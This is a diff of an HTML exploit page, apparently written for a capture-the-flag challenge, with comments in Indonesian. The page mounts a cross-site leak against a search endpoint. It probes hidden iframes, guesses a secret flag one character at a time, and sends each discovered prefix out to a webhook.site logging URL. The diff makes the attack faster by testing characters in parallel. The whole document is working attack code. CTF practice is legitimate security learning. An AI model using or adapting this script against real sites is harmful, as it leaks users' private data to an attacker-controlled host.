@@ -1,77 +1,46 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>XS-Leak Exploit</title>
-</head>
 <body>
-    <div id="status">Exploit sedang berjalan... Pantau Webhook kamu.</div>
     <script>
-        // PENGATURAN - GANTI URL WEBHOOK JIKA BERBEDA
         const TARGET = "https://wonder.cbd2026.cloud/search?q=";
         const LOGGER = "https://webhook.site/fb0f12dc-6949-4193-ac04-768d43746e00";
-        
-        // Alfabet lengkap (Huruf kecil, angka, underscore, penutup flag)
         const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_}";
 
-        async function check(query) {
-            return new Promise((resolve) => {
+        async function check(q) {
+            return new Promise(resolve => {
                 const ifr = document.createElement('iframe');
-                // Tambahkan random cache-buster agar bot tidak mengambil hasil lama
-                ifr.src = `${TARGET}${encodeURIComponent(query)}&cb=${Math.random()}`;
+                ifr.src = `${TARGET}${encodeURIComponent(q)}&cb=${Math.random()}`;
                 ifr.style.display = "none";
                 document.body.appendChild(ifr);
-
-                // Tunggu 2 detik agar PDF viewer sempat render
                 setTimeout(() => {
-                    try {
-                        // Jika window.length > 0, berarti PDF viewer (frame) terdeteksi
-                        const isMatch = ifr.contentWindow.length > 0;
-                        document.body.removeChild(ifr);
-                        resolve(isMatch);
-                    } catch (e) {
-                        // Jika kena block origin, biasanya itu tanda PDF viewer mencoba load
-                        document.body.removeChild(ifr);
-                        resolve(true); 
-                    }
-                }, 2000);
+                    const isMatch = ifr.contentWindow.length > 0;
+                    document.body.removeChild(ifr);
+                    resolve(isMatch);
+                }, 1500); // Delay 1.5 detik per burst
             });
         }
 
-        async function solve(currentFlag) {
-            // Beri tahu webhook kita sedang di posisi mana
-            fetch(`${LOGGER}?searching_at=${currentFlag}`);
-
-            for (let char of ALPHABET) {
-                let guess = currentFlag + char;
+        async function solve(current) {
+            fetch(`${LOGGER}?searching=${current}`);
+            
+            // Mengecek 10 karakter sekaligus dalam satu waktu
+            for (let i = 0; i < ALPHABET.length; i += 10) {
+                const chunk = ALPHABET.slice(i, i + 10).split('');
+                const results = await Promise.all(chunk.map(c => check(current + c)));
                 
-                // Update status di layar bot (opsional)
-                document.getElementById('status').innerText = "Mencoba: " + guess;
-
-                if (await check(guess)) {
-                    // JIKA KETEMU: Kirim ke webhook!
-                    fetch(`${LOGGER}?found=${encodeURIComponent(guess)}`);
-                    
-                    // Jika karakter tersebut adalah '}', berarti flag selesai
-                    if (char === '}') {
-                        fetch(`${LOGGER}?msg=FLAG_COMPLETE`);
-                        return;
+                for (let j = 0; j < results.length; j++) {
+                    if (results[j]) {
+                        const found = current + chunk[j];
+                        fetch(`${LOGGER}?found=${found}`);
+                        if (chunk[j] === '}') return;
+                        return solve(found); 
                     }
-                    
-                    // Lanjut cari karakter berikutnya
-                    return solve(guess);
                 }
             }
-            
-            // Jika semua alfabet dicoba dan tidak ada yang cocok
-            fetch(`${LOGGER}?msg=STOPPED_AT_${currentFlag}_CHECK_ALPHABET`);
         }
 
-        // Mulai serangan
-        // Jika bot mati di tengah jalan, ganti "cbd{" dengan hasil terakhir
-        // Contoh: solve("cbd{pdt_fl4g_");
-        fetch(`${LOGGER}?msg=BOT_STARTING_ATTACK`);
-        solve("cbd{");
-
+        fetch(`${LOGGER}?msg=FAST_ATTACK_STARTED`);
+        solve("cbd{"); 
     </script>
 </body>
 </html>
